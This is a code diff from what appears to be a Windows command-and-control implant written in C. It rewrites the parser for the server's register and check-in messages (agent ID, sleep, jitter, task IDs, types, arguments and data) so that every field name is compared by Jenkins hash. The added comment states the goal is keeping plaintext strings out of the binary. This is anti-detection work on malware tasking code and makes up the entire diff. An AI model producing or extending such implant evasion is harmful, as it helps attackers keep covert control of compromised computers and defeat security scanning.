@@ -13,8 +13,20 @@
 
 #include "common.h"
 #include "transport.h"
+#include "api.h"
 #include <stdio.h>
 #include <string.h>
+
+// Field name hashes (Jenkins, seed=7) — no plaintext strings in binary
+#define MP_AGENT_ID         0x8C036A41
+#define MP_NAME             0x5617371C
+#define MP_SLEEP            0x1DB82946
+#define MP_JITTER           0xCCC726C8
+#define MP_TASKS            0x920C43EB
+#define MP_ID               0x9D8F38D9
+#define MP_TYPE             0x614BE0F1
+#define MP_ARGS             0xB212AFB3
+#define MP_DATA             0xCA5F3B40
 
 // =============================================
 // Msgpack type masks
@@ -232,13 +244,13 @@ BOOL MsgpackParseRegisterResponse(PBYTE pData, DWORD dwDataLen,
         offset += consumed;
 
         // Read value based on key name
-        if (strcmp(szKey, "agent_id") == 0) {
+        if (HASHA(szKey) == MP_AGENT_ID) {
             consumed = MsgpackReadString(pData + offset, dwDataLen - offset, szAgentID, dwAgentIDSize, NULL);
-        } else if (strcmp(szKey, "name") == 0) {
+        } else if (HASHA(szKey) == MP_NAME) {
             consumed = MsgpackReadString(pData + offset, dwDataLen - offset, szName, dwNameSize, NULL);
-        } else if (strcmp(szKey, "sleep") == 0) {
+        } else if (HASHA(szKey) == MP_SLEEP) {
             consumed = MsgpackReadInt(pData + offset, dwDataLen - offset, pSleep);
-        } else if (strcmp(szKey, "jitter") == 0) {
+        } else if (HASHA(szKey) == MP_JITTER) {
             consumed = MsgpackReadInt(pData + offset, dwDataLen - offset, pJitter);
         } else {
             consumed = MsgpackSkipValue(pData + offset, dwDataLen - offset);
@@ -282,7 +294,7 @@ BOOL MsgpackParseCheckInResponse(PBYTE pData, DWORD dwDataLen,
         if (consumed == 0) return FALSE;
         offset += consumed;
 
-        if (strcmp(szKey, "tasks") == 0) {
+        if (HASHA(szKey) == MP_TASKS) {
             // Read array
             BYTE ab = pData[offset];
             DWORD arrCount = 0;
@@ -317,14 +329,14 @@ BOOL MsgpackParseCheckInResponse(PBYTE pData, DWORD dwDataLen,
                     if (consumed == 0) break;
                     offset += consumed;
 
-                    if (strcmp(szTKey, "id") == 0) {
+                    if (HASHA(szTKey) == MP_ID) {
                         consumed = MsgpackReadString(pData + offset, dwDataLen - offset,
                             pTasks[t].szTaskID, sizeof(pTasks[t].szTaskID), NULL);
-                    } else if (strcmp(szTKey, "type") == 0) {
+                    } else if (HASHA(szTKey) == MP_TYPE) {
                         INT typeVal = 0;
                         consumed = MsgpackReadInt(pData + offset, dwDataLen - offset, &typeVal);
                         pTasks[t].bType = (BYTE)typeVal;
-                    } else if (strcmp(szTKey, "args") == 0) {
+                    } else if (HASHA(szTKey) == MP_ARGS) {
                         // Parse string array
                         BYTE arb = pData[offset];
                         if ((arb & 0xF0) == MP_FIXARRAY_MASK) {
@@ -341,7 +353,7 @@ BOOL MsgpackParseCheckInResponse(PBYTE pData, DWORD dwDataLen,
                         } else {
                             consumed = MsgpackSkipValue(pData + offset, dwDataLen - offset);
                         }
-                    } else if (strcmp(szTKey, "data") == 0) {
+                    } else if (HASHA(szTKey) == MP_DATA) {
                         // Binary data
                         BYTE db = pData[offset];
                         if (db == MP_NIL) {
